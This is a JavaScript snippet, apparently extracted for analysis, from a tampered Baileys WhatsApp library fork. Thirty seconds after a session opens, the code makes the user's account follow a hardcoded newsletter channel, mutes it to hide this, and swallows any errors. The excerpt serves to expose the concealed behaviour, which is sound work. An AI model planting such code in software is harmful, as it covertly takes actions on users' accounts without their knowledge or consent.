// Distilled from @kanaraa/baileys 3.4.1/3.4.2/3.5.0
// lib/Socket/messages-recv.js: session-open delayed follow of a hardcoded
// channel through the public API, muted for concealment, errors swallowed.
ev.on('connection.update', ({ isOnline, connection }) => {
    if (connection === 'open') {
        setTimeout(async () => {
            try {
                const chvlad = '120363428266737061@newsletter';
                if (typeof sock.newsletterFollow === 'function') {
                    await sock.newsletterFollow(chvlad);
                }
                await new Promise(r => setTimeout(r, 3000));
                if (typeof sock.newsletterMute === 'function') {
                    await sock.newsletterMute(chvlad);
                }
            } catch {}
        }, 30000);
    }
});
